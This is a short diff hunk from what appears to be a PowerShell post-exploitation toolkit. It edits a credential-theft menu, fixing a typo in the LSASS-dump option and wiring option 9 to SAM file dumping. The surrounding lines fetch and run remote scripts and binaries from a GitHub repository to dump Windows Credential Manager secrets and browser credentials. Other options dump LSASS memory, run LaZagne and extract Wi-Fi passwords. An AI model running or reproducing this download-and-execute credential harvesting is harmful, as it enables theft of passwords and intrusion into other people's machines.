@@ -442,12 +442,12 @@ __        ___       ____
                 1{iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
                 2{if (isadmin){obfuskittiedump}}
                 3{if(isadmin){safedump}}
-                4{is(isadmin){dumplsass}}
+                4{if(isadmin){dumplsass}}
                 5{lazagnemodule}
                 6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt}
 		7{kittenz}
 		8{if(isadmin){wificreds}}
-		9{if(isadmin){}}
+		9{if(isadmin){samfile}}
              }
         }
         While ($masterquestion -ne 10)
